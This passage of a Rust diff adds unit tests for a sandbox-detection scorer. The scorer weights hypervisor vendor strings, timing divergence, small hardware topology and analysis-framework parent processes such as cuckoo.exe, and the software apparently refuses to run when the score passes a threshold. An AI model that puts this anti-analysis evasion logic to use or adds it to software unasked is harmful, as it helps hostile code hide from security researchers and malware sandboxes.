             "medium heuristic-only indicators should be informational"
+        );
+    }
+
+    #[test]
+    fn zero_weight_expected_context_does_not_bypass_heuristic_guard() {
+        let indicators = vec![
+            common::SandboxIndicator {
+                category: "cloud_bios".to_string(),
+                detail: "Known cloud hypervisor DMI/registry strings detected".to_string(),
+                weight: 0,
+                source: "registry".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "timing".to_string(),
+                detail: "Low mouse activity".to_string(),
+                weight: 30,
+                source: "mouse".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "desktop".to_string(),
+                detail: "Few desktop windows".to_string(),
+                weight: 25,
+                source: "desktop".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "uptime".to_string(),
+                detail: "Low uptime".to_string(),
+                weight: 10,
+                source: "uptime".to_string(),
+            },
+        ];
+
+        let (is_sandbox, _, _) = evaluate_sandbox_score(&indicators);
+        assert!(
+            !is_sandbox,
+            "zero-weight expected context must not make heuristic-only evidence look corroborated"
         );
     }
 
@@ -3511,6 +4291,290 @@ mod tests {
         assert!(
             !report.should_refuse(false, false, Some(60)),
             "headless macOS sandbox score {score} should not exceed threshold 60"
+        );
+    }
+
+    // ── Hardened detection indicators ─────────────────────────────────────────
+
+    // ── 1. Hypervisor vendor classification ──────────────────────────────────
+
+    /// VirtualBox vendor string always yields weight 30, even when cloud is
+    /// confirmed (no legitimate cloud uses VirtualBox).
+    #[test]
+    fn hypervisor_vendor_vbox_is_always_suspicious() {
+        let vendor = *b"VBoxVBoxVBox";
+        let ind_no_cloud = classify_hypervisor_vendor(&vendor, false).unwrap();
+        let ind_cloud = classify_hypervisor_vendor(&vendor, true).unwrap();
+        assert_eq!(ind_no_cloud.weight, 30);
+        assert_eq!(ind_cloud.weight, 30);
+        assert_eq!(ind_no_cloud.source, "cpuid_vendor");
+    }
+
+    /// VMware vendor string has weight 20 without cloud and 5 with cloud
+    /// (enterprise VMware vCloud is a plausible but uncommon deployment).
+    #[test]
+    fn hypervisor_vendor_vmware_weight_depends_on_cloud() {
+        let vendor = *b"VMwareVMware";
+        let ind_no_cloud = classify_hypervisor_vendor(&vendor, false).unwrap();
+        let ind_cloud = classify_hypervisor_vendor(&vendor, true).unwrap();
+        assert_eq!(ind_no_cloud.weight, 20);
+        assert_eq!(ind_cloud.weight, 5);
+    }
+
+    /// Microsoft Hv vendor string yields weight 0 when cloud is confirmed
+    /// (Azure always presents "Microsoft Hv").
+    #[test]
+    fn hypervisor_vendor_microsoft_hv_cloud_confirmed_is_zero() {
+        let vendor = *b"Microsoft Hv";
+        let ind = classify_hypervisor_vendor(&vendor, true);
+        assert!(
+            ind.is_none(),
+            "Microsoft Hv on confirmed cloud should produce no indicator"
+        );
+    }
+
+    /// Microsoft Hv with cloud unconfirmed is mildly suspicious.
+    #[test]
+    fn hypervisor_vendor_microsoft_hv_unconfirmed_has_weight() {
+        let vendor = *b"Microsoft Hv";
+        let ind = classify_hypervisor_vendor(&vendor, false).unwrap();
+        assert_eq!(ind.weight, 10);
+    }
+
+    /// KVM vendor yields weight 0 when cloud confirmed.
+    #[test]
+    fn hypervisor_vendor_kvm_cloud_confirmed_is_zero() {
+        let mut vendor = [0u8; 12];
+        vendor[..9].copy_from_slice(b"KVMKVMKVM");
+        let ind = classify_hypervisor_vendor(&vendor, true);
+        assert!(ind.is_none());
+    }
+
+    /// KVM vendor with cloud unconfirmed is mildly suspicious.
+    #[test]
+    fn hypervisor_vendor_kvm_unconfirmed_has_weight() {
+        let mut vendor = [0u8; 12];
+        vendor[..9].copy_from_slice(b"KVMKVMKVM");
+        let ind = classify_hypervisor_vendor(&vendor, false).unwrap();
+        assert_eq!(ind.weight, 10);
+    }
+
+    // ── 2. Timing consistency divergence calculation ──────────────────────────
+
+    /// Divergence percentage calculation: 0% when sources agree.
+    #[test]
+    fn timing_consistency_divergence_zero_when_equal() {
+        // Simulate equal QPC-in-100ns and FILETIME delta.
+        let qpc_in_100ns: u64 = 50_000;
+        let ft_delta: u64 = 50_000;
+        let max_v = qpc_in_100ns.max(ft_delta);
+        let min_v = qpc_in_100ns.min(ft_delta);
+        let divergence_pct = (max_v - min_v).saturating_mul(100) / max_v;
+        assert_eq!(divergence_pct, 0, "equal sources should give 0% divergence");
+    }
+
+    /// Divergence percentage calculation: 50% when one is double the other.
+    #[test]
+    fn timing_consistency_divergence_fifty_pct() {
+        let qpc_in_100ns: u64 = 100_000;
+        let ft_delta: u64 = 50_000;
+        let max_v = qpc_in_100ns.max(ft_delta);
+        let min_v = qpc_in_100ns.min(ft_delta);
+        let divergence_pct = (max_v - min_v).saturating_mul(100) / max_v;
+        assert_eq!(divergence_pct, 50);
+    }
+
+    // ── 3. Hardware topology indicator weights ────────────────────────────────
+
+    /// Topology indicators from `collect_indicators` have their weight zeroed
+    /// when both cloud signals fire.
+    #[test]
+    fn topology_indicators_zeroed_on_confirmed_cloud() {
+        let mut indicators = vec![
+            common::SandboxIndicator {
+                category: "topology".to_string(),
+                detail: "1 logical CPU".to_string(),
+                weight: 15,
+                source: "topology".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "topology".to_string(),
+                detail: "1 GiB RAM".to_string(),
+                weight: 15,
+                source: "topology".to_string(),
+            },
+        ];
+        // Simulate the collect_indicators cloud-aware zeroing step.
+        let cloud_confirmed = true;
+        if cloud_confirmed {
+            for ind in indicators.iter_mut() {
+                if ind.source == "topology" || ind.source == "network" {
+                    ind.weight = 0;
+                }
+            }
+        }
+        assert!(indicators.iter().all(|i| i.weight == 0));
+    }
+
+    /// Topology indicators retain weight when cloud is not confirmed.
+    #[test]
+    fn topology_indicators_keep_weight_without_cloud() {
+        let mut indicators = vec![common::SandboxIndicator {
+            category: "topology".to_string(),
+            detail: "1 logical CPU".to_string(),
+            weight: 15,
+            source: "topology".to_string(),
+        }];
+        let cloud_confirmed = false;
+        if cloud_confirmed {
+            for ind in indicators.iter_mut() {
+                if ind.source == "topology" {
+                    ind.weight = 0;
+                }
+            }
+        }
+        assert_eq!(indicators[0].weight, 15);
+    }
+
+    // ── 4. Process lineage classification ─────────────────────────────────────
+
+    /// python.exe parent → weight 25 (analysis framework).
+    #[test]
+    fn process_lineage_python_parent_is_suspicious() {
+        let ind = classify_parent_process_name(Some("python.exe")).unwrap();
+        assert_eq!(ind.weight, 25);
+        assert_eq!(ind.source, "lineage");
+    }
+
+    /// java.exe parent → weight 25.
+    #[test]
+    fn process_lineage_java_parent_is_suspicious() {
+        let ind = classify_parent_process_name(Some("java.exe")).unwrap();
+        assert_eq!(ind.weight, 25);
+    }
+
+    /// cuckoo.exe parent → weight 25.
+    #[test]
+    fn process_lineage_cuckoo_parent_is_suspicious() {
+        let ind = classify_parent_process_name(Some("cuckoo.exe")).unwrap();
+        assert_eq!(ind.weight, 25);
+    }
+
+    /// explorer.exe parent → no indicator (legitimate launch).
+    #[test]
+    fn process_lineage_explorer_parent_is_benign() {
+        let ind = classify_parent_process_name(Some("explorer.exe"));
+        assert!(
+            ind.is_none(),
+            "explorer.exe parent should not produce an indicator"
+        );
+    }
+
+    /// svchost.exe parent → no indicator.
+    #[test]
+    fn process_lineage_svchost_parent_is_benign() {
+        assert!(classify_parent_process_name(Some("svchost.exe")).is_none());
+    }
+
+    /// No parent → weight 5 (orphaned process).
+    #[test]
+    fn process_lineage_no_parent_is_mildly_suspicious() {
+        let ind = classify_parent_process_name(None).unwrap();
+        assert_eq!(ind.weight, 5);
+    }
+
+    // ── 5. Network environment ────────────────────────────────────────────────
+
+    /// Network indicator source is "network" so that cloud-aware zeroing applies.
+    #[test]
+    fn network_indicator_source_is_network() {
+        // Simulate the indicator that would be created for 1 adapter.
+        let ind = common::SandboxIndicator {
+            category: "network".to_string(),
+            detail: "1 physical NIC(s) and no enterprise proxy".to_string(),
+            weight: 5,
+            source: "network".to_string(),
+        };
+        assert_eq!(ind.source, "network");
+        assert_eq!(ind.weight, 5);
+    }
+
+    /// Network indicators are zeroed on confirmed cloud (same mechanism as topology).
+    #[test]
+    fn network_indicator_zeroed_on_confirmed_cloud() {
+        let mut indicators = vec![common::SandboxIndicator {
+            category: "network".to_string(),
+            detail: "1 physical NIC".to_string(),
+            weight: 5,
+            source: "network".to_string(),
+        }];
+        let cloud_confirmed = true;
+        if cloud_confirmed {
+            for ind in indicators.iter_mut() {
+                if ind.source == "topology" || ind.source == "network" {
+                    ind.weight = 0;
+                }
+            }
+        }
+        assert_eq!(indicators[0].weight, 0);
+    }
+
+    // ── Combined: sandbox profile with new indicators triggers detection ───────
+
+    /// A simulated sandbox with VirtualBox vendor + analysis framework parent +
+    /// small topology scores above the 30-point detection threshold.
+    #[test]
+    fn combined_sandbox_indicators_exceed_threshold() {
+        let indicators = vec![
+            common::SandboxIndicator {
+                category: "hypervisor_vendor".to_string(),
+                detail: "VirtualBox hypervisor vendor".to_string(),
+                weight: 30,
+                source: "cpuid_vendor".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "lineage".to_string(),
+                detail: "Spawned by python.exe".to_string(),
+                weight: 25,
+                source: "lineage".to_string(),
+            },
+        ];
+        let (is_sandbox, threshold, _) = evaluate_sandbox_score(&indicators);
+        assert!(
+            is_sandbox,
+            "VBox(30) + lineage(25) = 55 should exceed threshold {threshold}"
+        );
+    }
+
+    /// Cloud VM indicators (confirmed) should NOT be classified as sandbox
+    /// even with small topology numbers.
+    #[test]
+    fn cloud_confirmed_topology_does_not_trigger_detection() {
+        // Simulate confirmed cloud VM: topology indicators zeroed.
+        let indicators = vec![
+            common::SandboxIndicator {
+                category: "cloud_bios".to_string(),
+                detail: "Known cloud hypervisor DMI/registry strings detected".to_string(),
+                weight: 0,
+                source: "registry".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "cloud_bios".to_string(),
+                detail: "IMDS endpoint responded — cloud instance confirmed".to_string(),
+                weight: 0,
+                source: "imds".to_string(),
+            },
+            common::SandboxIndicator {
+                category: "topology".to_string(),
+                detail: "1 logical CPU — zeroed by cloud confirmation".to_string(),
+                weight: 0, // Zeroed because cloud confirmed
+                source: "topology".to_string(),
+            },
+        ];
+        let (is_sandbox, _, _) = evaluate_sandbox_score(&indicators);
+        assert!(
+            !is_sandbox,
+            "zeroed topology on confirmed cloud must not trigger detection"
         );
     }
 }
